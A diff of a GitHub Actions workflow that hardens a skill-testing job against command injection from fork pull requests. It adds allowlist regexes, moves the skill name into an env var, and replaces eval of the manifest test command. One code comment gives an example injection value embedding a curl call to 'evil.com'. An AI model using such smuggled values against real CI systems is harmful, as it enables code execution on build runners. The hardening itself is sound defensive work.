@@ -105,26 +105,60 @@ jobs:
           npx tsx -e
           "import { initPaperclawDir } from './skills-engine/index'; initPaperclawDir();"
 
+      # Validate the skill name once, up front. matrix.skill comes from the
+      # PR's diff (a directory name under .claude/skills/), so it is attacker-
+      # controlled on fork PRs. Funnel it through an env var (never interpolate
+      # ${{ matrix.skill }} directly into a run: block — that would let a name
+      # like "foo$(curl evil.com)" execute on the runner) and reject anything
+      # outside the allowlist before any later step uses it.
+      - name: Validate skill name
+        env:
+          SKILL: ${{ matrix.skill }}
+        run: |
+          if ! [[ "$SKILL" =~ ^[a-zA-Z0-9_-]+$ ]]; then
+            echo "::error::Invalid skill directory name: $SKILL"
+            echo "Allowed characters: a-z A-Z 0-9 _ -"
+            exit 1
+          fi
+          echo "SKILL=$SKILL" >> "$GITHUB_ENV"
+
       - name: Apply skill
-        run: npx tsx scripts/apply-skill.ts ".claude/skills/${{ matrix.skill }}"
+        run: npx tsx scripts/apply-skill.ts ".claude/skills/$SKILL"
 
       - name: Typecheck after apply
         run: npx tsc --noEmit
 
+      # The manifest's `test:` field is also PR-controlled, so we cannot pipe
+      # it through `eval`. Constrain it to the only shape skills actually use
+      # — `npx vitest run <path>` — and reject anything else. After the regex
+      # check the value contains no shell metacharacters, so word-splitting
+      # the variable is enough to invoke it safely (no eval, no bash -c).
+      #
+      # SKILL is read from the env var rather than `${{ matrix.skill }}` so
+      # that even a future regression in the validate step can't smuggle shell
+      # metacharacters through GitHub Actions text substitution.
       - name: Run skill tests
         run: |
           TEST_CMD=$(npx tsx -e "
             import { parse } from 'yaml';
             import fs from 'fs';
-            const m = parse(fs.readFileSync('.claude/skills/${{ matrix.skill }}/manifest.yaml', 'utf-8'));
+            const skill = process.env.SKILL;
+            const m = parse(fs.readFileSync('.claude/skills/' + skill + '/manifest.yaml', 'utf-8'));
             if (m.test) console.log(m.test);
           ")
-          if [ -n "$TEST_CMD" ]; then
-            echo "Running: $TEST_CMD"
-            eval "$TEST_CMD"
-          else
+          if [ -z "$TEST_CMD" ]; then
             echo "No test command defined, skipping"
+            exit 0
           fi
+          if ! [[ "$TEST_CMD" =~ ^npx[[:space:]]+vitest[[:space:]]+run[[:space:]]+[A-Za-z0-9._/-]+$ ]]; then
+            echo "::error::Skill test command failed allowlist check."
+            echo "Got:     $TEST_CMD"
+            echo "Allowed: 'npx vitest run <path>' (path chars: A-Z a-z 0-9 . _ - /)"
+            exit 1
+          fi
+          echo "Running: $TEST_CMD"
+          # shellcheck disable=SC2086 -- intentional word splitting after allowlist
+          $TEST_CMD
 
   # ── Summary gate for branch protection ────────────────────────────────
   skill-validation-summary:
